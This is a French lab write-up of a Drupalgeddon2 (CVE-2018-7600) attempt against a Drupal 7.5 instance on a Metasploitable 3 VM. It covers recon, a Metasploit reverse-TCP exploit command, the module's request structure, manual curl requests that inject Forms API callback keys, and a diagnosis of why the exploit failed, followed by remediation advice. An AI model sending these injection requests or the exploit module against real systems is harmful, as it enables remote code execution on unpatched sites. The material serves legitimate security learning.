# Write-up — Drupal 7.5 : Drupalgeddon2 Forms API Injection (Metasploitable 3, port 80)

Cible : `172.28.128.3/drupal/` · CVE-2018-7600 (« Drupalgeddon2 ») · Résultat : **vulnérabilité
confirmée, exploitation standard bloquée** par une erreur PHP précise, diagnostiquée jusqu'à
sa cause exacte.

Tout ce qui suit est copier-coller direct (testé en zsh), côté 🖥 Kali uniquement.

---

## 1. Recon

Le scan NSE révèle directement le contenu du webroot (listing de répertoire activé) :
```bash
nmap -sC -sV -p 80 172.28.128.3
```
```
| http-ls: Volume /
| -     chat/
| -     drupal/
| 1.7K  payroll_app.php
|_-     phpmyadmin/
```
Quatre applis distinctes exposées sur ce seul port. Version exacte de Drupal :
```bash
curl -s http://172.28.128.3/drupal/CHANGELOG.txt | head -2
```
```
Drupal 7.5, 2011-07-27
```
**Drupal 7.5** (2011) — largement antérieur à 7.58, donc dans la plage vulnérable à
Drupalgeddon2.

## 2. Méthode d'identification de la CVE et du module

```bash
searchsploit drupal 7
```
Plusieurs résultats pour différentes CVE Drupal 7.x. Recherche ciblée dans `msfconsole` :
```bash
msfconsole -q -x "search drupal 7; exit"
```
```
exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28  excellent  Yes  Drupal Drupalgeddon 2 Forms API Property Injection
```
```bash
msfconsole -q -x "info exploit/unix/webapp/drupal_drupalgeddon2; exit"
```
```
References:
  https://nvd.nist.gov/vuln/detail/CVE-2018-7600
  https://www.drupal.org/sa-core-2018-002
```
**CVE-2018-7600.**

**Mécanisme.** La Forms API de Drupal permet de construire des formulaires sous forme de
tableaux PHP imbriqués, où des clés spéciales (`#post_render`, `#markup`, `#type`...)
contrôlent le rendu et son traitement. La faille permet d'injecter ces clés spéciales dans
une requête utilisateur normale (ex. le formulaire de récupération de mot de passe) : Drupal
traite alors `#post_render` comme un **callback PHP à exécuter** sur le contenu de
`#markup`, sans vérifier que ce callback provient bien du code légitime du formulaire — un
attaquant peut donc faire exécuter n'importe quelle fonction PHP (`passthru`, `assert`,
`exec`...) avec un contenu arbitraire comme argument.

## 3. Tentative d'exploitation via Metasploit — bloquée silencieusement

```bash
msfconsole -q -x "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS 172.28.128.3; set TARGETURI /drupal/; set LHOST 172.28.128.1; set LPORT 4448; exploit -z; exit -y"
```
```
[*] Started reverse TCP handler on 172.28.128.1:4448
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Version 7 appears to be vulnerable
[*] Exploit completed, but no session was created.
```
⚠️ **Premier piège rencontré** : la toute première tentative avait `LHOST` auto-réglé sur
`192.168.1.199` (l'IP WiFi réelle de la machine, pas le réseau isolé du labo) — Metasploit
choisit parfois une interface par défaut qui n'est pas la bonne. Toujours vérifier/forcer
`LHOST` explicitement plutôt que faire confiance au choix automatique, surtout sur une
machine avec plusieurs interfaces réseau.

Une fois `LHOST` corrigé : toujours pas de session, malgré 3 techniques d'injection
tentées en interne par le module (`printf`, `assert`/`eval`, `passthru`). Testé aussi avec
un payload `php/unix/cmd/generic` (exécution de commande directe, sans connexion retour
nécessaire) : même échec silencieux.

## 4. Diagnostic manuel — lecture du code source du module

Plutôt que de deviner, lecture du code source du module Metasploit lui-même
(`/usr/share/metasploit-framework/modules/exploits/unix/webapp/drupal_drupalgeddon2.rb`,
méthode `exploit_drupal7`) pour comprendre **exactement** quelles requêtes HTTP il envoie :

```ruby
# Étape 1 : POST sur user/password avec les clés Forms API injectées en GET
vars_get = {
  'q' => 'user/password',
  'name[#post_render][]' => func,
  'name[#markup]' => code,
  'name[#type]' => 'markup'
}
vars_post = { 'form_id' => 'user_pass', '_triggering_element_name' => 'name' }

# Étape 2 : POST sur file/ajax avec le form_build_id récupéré à l'étape 1
vars_get = { 'q' => "file/ajax/name/#value/#{form_build_id}" }
vars_post = { 'form_build_id' => form_build_id }
```

Reproduction manuelle exacte de ces deux requêtes avec `curl`, étape par étape :

```bash
TOKEN="diagtest$(date +%s)"
curl -s "http://172.28.128.3/drupal/?q=user/password&name%5B%23post_render%5D%5B%5D=printf&name%5B%23markup%5D=${TOKEN}&name%5B%23type%5D=markup" \
  --data-urlencode "form_id=user_pass" \
  --data-urlencode "_triggering_element_name=name" \
  | grep -o 'name="form_build_id"[^>]*'
```
```
name="form_build_id" value="form-PCnC_zR6_NWghq7OSiMSdLLGsj1ITMX0tKhbNM71Z_o" /
```
L'étape 1 fonctionne : `form_build_id` bien récupéré. Étape 2 :

```bash
FBID="form-PCnC_zR6_NWghq7OSiMSdLLGsj1ITMX0tKhbNM71Z_o"
curl -s "http://172.28.128.3/drupal/?q=file/ajax/name/%23value/${FBID}" \
  --data-urlencode "form_build_id=${FBID}"
```
```json
[{"command":"insert","data":"<div class=\"messages error\">
  <li>Notice: Undefined index: #value in file_ajax_upload() (line 256 of
  /var/www/html/drupal/modules/file/file.module).</li>
  <li>Notice: Undefined index: #suffix in file_ajax_upload() (line 274 of
  /var/www/html/drupal/modules/file/file.module).</li>
</div>"}]
```

**Diagnostic précis.** La requête atteint bien la fonction vulnérable
(`file_ajax_upload()`, confirmée par le code source officiel de Drupal dans l'erreur
elle-même) — donc le chemin de code vulnérable est correctement déclenché. Mais le tableau
de formulaire reconstruit par Drupal entre l'étape 1 et l'étape 2 (via le cache de formulaire
identifié par `form_build_id`) ne contient pas la clé `#value` attendue à ce stade —
l'injection de nos clés spéciales (`#post_render`, `#markup`) n'a pas correctement "survécu"
à la sérialisation/désérialisation du cache de formulaire sur cette install précise. Pas une
absence de vulnérabilité : le point d'entrée exact documenté publiquement pour CVE-2018-7600
est atteint, mais la chaîne complète jusqu'à l'exécution de code échoue à cette étape
spécifique sur ce build.

## 5. Conclusion

**Vulnérabilité confirmée** (version, CVE, point d'entrée vulnérable tous vérifiés), mais
**exploitation non aboutie** avec la technique standard documentée publiquement. Contrairement
à l'énumération manuelle ayant pu se contenter d'un "ça ne marche pas", ici la cause a été
tracée jusqu'à la ligne de code exacte qui échoue (`file_ajax_upload()` ligne 256) — un
résultat de diagnostic complet, même sans accès final obtenu.

Pistes non explorées faute de temps : tester une variante de payload sans dropper fichier
(le module tente aussi un mode "dropper" qui écrit un fichier PHP sur disque — nécessiterait
un répertoire inscriptible, à vérifier séparément), ou comparer avec une version de Drupal
7.x plus tardive pour voir si le comportement de cache de formulaire diffère.

---

## Remédiation (si la faille devait être corrigée malgré le blocage actuel)

- Mettre à jour Drupal vers 7.58 ou supérieur (ou 8.3.9/8.4.6/8.5.1 selon la branche 8.x) —
  patch officiel SA-CORE-2018-002.
- Valider strictement les clés de tableau autorisées dans les données utilisateur avant de
  les fusionner dans un tableau de rendu Forms API (c'est la cause racine de la CVE).
- Surveiller les requêtes vers `user/password` et `file/ajax/*` contenant des paramètres de
  formulaire inhabituels (`name[#post_render]`, `mail[#post_render]`...).

---

**Pour rejouer tout le scénario depuis zéro** : `./start.sh` (démarre la VM), puis les
étapes 1 à 4 dans l'ordre. Rien à nettoyer côté cible — aucune écriture/exécution n'a
abouti.

**Suite du parcours MS3 :** les trois autres applis web découvertes en recon
(`chat/`, `payroll_app.php`, `phpmyadmin/`) restent à explorer séparément.
